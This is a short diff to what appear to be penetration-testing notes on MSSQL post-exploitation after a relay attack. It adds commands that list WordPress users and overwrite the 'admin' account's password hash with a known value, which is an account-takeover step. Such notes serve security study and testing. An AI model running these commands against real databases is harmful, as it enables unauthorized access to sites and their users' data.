@@ -128,7 +128,13 @@ Last step is to perform the Relay - !REMEMEBER! not to our attacking box, but to
 List databases:
 - `select * from sys.databases;`
 
-List tables inside specific databases:
+List tables inside specific database:
 - `select * from <DATABASE NAME>..sysobjects WHERE xtype = 'U';`
+
+List columns inside specific table :
+- `select * from wordpress..wp_users;`
+
+Update specific column:
+- `update wordpress..wp_users set user_pass = '$P$BAyzjPk37CdiX/e/XxwB9I7wZgBG8Q/' WHERE user_login = 'admin';`
 
 
